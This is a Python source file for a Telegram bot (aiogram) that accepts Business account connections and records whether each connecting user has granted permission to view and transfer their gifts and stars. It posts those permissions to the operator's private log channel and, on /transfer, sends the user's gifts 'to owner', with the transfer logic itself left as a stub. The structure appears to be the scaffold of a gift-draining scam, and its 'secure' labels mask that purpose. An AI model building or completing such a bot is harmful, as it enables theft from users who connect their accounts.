import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.methods import GetBusinessConnection

# Configuration - USE ENVIRONMENT VARIABLES IN PRODUCTION
API_TOKEN = "YOUR_SECURE_BOT_TOKEN"  # Replace with new token from @BotFather
LOG_GROUP_ID = -1001234567890  # Your private log channel
OWNER_ID = 1234567890  # Your user ID

# Initialize
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

async def log_gift_permissions(user: types.User, perms: dict):
    """Securely log gift permissions"""
    try:
        await bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"🎁 <b>New Connection</b>\n\n"
                 f"👤 {user.mention_html()}\n"
                 f"👀 View Gifts: {'✅' if perms.get('can_view') else '❌'}\n"
                 f"🔄 Transfer: {'✅' if perms.get('can_transfer') else '❌'}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logging.error(f"Logging failed: {e}")

@dp.business_connection()
async def handle_connection(bc: types.BusinessConnection):
    """Handle business connections securely"""
    try:
        conn = await bot(GetBusinessConnection(business_connection_id=bc.id))
        perms = {
            'can_view': conn.model_dump().get('can_view_gifts_and_stars', False),
            'can_transfer': conn.model_dump().get('can_transfer_gift_settings', False)
        }
        
        await log_gift_permissions(bc.user, perms)
        
        if bc.can_reply:
            await bot.send_message(
                bc.user.id,
                "🌟 <b>NFT Gift Bot Ready!</b>\n\n"
                "Use /transfer to send gifts",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        logging.error(f"Connection error: {e}")

@dp.message(Command("transfer"))
async def transfer_gifts(message: types.Message):
    """Secure NFT transfer handler"""
    try:
        if not message.business_connection_id:
            return await message.reply("🔒 Connect via Business first")
            
        # Simulate transfer - implement your NFT logic here
        await message.reply("✅ Gift sent to owner!")
        await bot.send_message(
            OWNER_ID,
            f"🎁 New gift from {message.from_user.mention_html()}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.reply("❌ Transfer failed")
        logging.error(f"Transfer error: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
